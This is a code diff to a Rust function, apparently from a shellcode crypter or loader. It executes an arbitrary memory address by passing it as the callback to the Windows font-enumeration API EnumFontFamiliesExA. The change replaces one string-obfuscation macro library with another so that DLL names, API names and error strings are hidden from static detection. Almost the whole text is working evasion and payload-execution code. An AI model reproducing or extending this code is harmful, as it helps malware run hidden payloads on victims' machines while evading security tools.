@@ -1,6 +1,6 @@
 pub unsafe fn exec(p: usize) -> Result<(), String> {
     use crate::utils::{load_library, get_proc_address};
-    use rustcrypt_ct_macros::{obf_lit, obf_lit_bytes};
+use obfstr::{obfbytes, obfstr};
     use std::mem::transmute;
 
     #[repr(C)]
@@ -22,12 +22,12 @@ pub unsafe fn exec(p: usize) -> Result<(), String> {
         lf_face_name: [u8; 32],
     }
 
-    let gdi32 = load_library(obf_lit_bytes!(b"gdi32.dll\0").as_slice())?;
-    let user32 = load_library(obf_lit_bytes!(b"user32.dll\0").as_slice())?;
+    let gdi32 = load_library(obfbytes!(b"gdi32.dll\0").as_slice())?;
+    let user32 = load_library(obfbytes!(b"user32.dll\0").as_slice())?;
 
-    let p_enum_font = get_proc_address(gdi32, obf_lit_bytes!(b"EnumFontFamiliesExA\0").as_slice())?;
-    let p_get_dc = get_proc_address(user32, obf_lit_bytes!(b"GetDC\0").as_slice())?;
-    let p_release_dc = get_proc_address(user32, obf_lit_bytes!(b"ReleaseDC\0").as_slice())?;
+    let p_enum_font = get_proc_address(gdi32, obfbytes!(b"EnumFontFamiliesExA\0").as_slice())?;
+    let p_get_dc = get_proc_address(user32, obfbytes!(b"GetDC\0").as_slice())?;
+    let p_release_dc = get_proc_address(user32, obfbytes!(b"ReleaseDC\0").as_slice())?;
 
     type EnumFontFamiliesExAFn = unsafe extern "system" fn(
         hdc: isize,
@@ -48,12 +48,12 @@ pub unsafe fn exec(p: usize) -> Result<(), String> {
     let cb: FontEnumProc = Some(std::mem::transmute(p));
     let hdc = get_dc(0);
     if hdc == 0 {
-        return Err(obf_lit!("GetDC failed").to_string());
+        return Err(obfstr!("GetDC failed").to_string());
     }
     let ret = enum_font_families_ex_a(hdc, &logfont, cb, 0, 0);
     release_dc(0, hdc);
     if ret == 0 {
-        return Err(obf_lit!("EnumFontFamiliesExA failed or callback not triggered").to_string());
+        return Err(obfstr!("EnumFontFamiliesExA failed or callback not triggered").to_string());
     }
     Ok(())
 }
